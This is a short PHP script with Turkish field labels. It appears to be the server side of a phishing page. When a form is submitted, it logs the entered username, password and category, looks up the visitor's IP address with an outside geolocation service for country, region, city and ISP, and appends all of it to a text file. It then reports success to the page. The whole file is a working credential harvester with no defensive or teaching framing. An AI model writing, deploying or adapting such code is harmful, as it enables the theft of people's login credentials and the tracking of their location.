<?php

sleep(2);

//error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Europe/Istanbul");

$data = [];


if(isset($_POST))
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    $json = json_decode($output, true);
    
    $dosya = fopen("baris-altay.txt", "a");
    fwrite($dosya, "
    \$_KULLANICI_ADI : " . $_POST['username'] . "
    
    \$_SIFRE         : " . $_POST['password'] . "
   
    \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
    
    \$_ULKE          : " . $json['country'] . "
    
    \$_SEHIR         : " . $json['regionName'] . "
    
    \$_ILCE          : " . $json['city'] . "
    
    \$_ISP           : " . $json['isp'] . "
    
    \$_KATEGORI      : " . $_POST['category'] . "
    

    
    
    ");
    fclose($dosya);

    $data["success"] = "Success";
}

echo json_encode($data);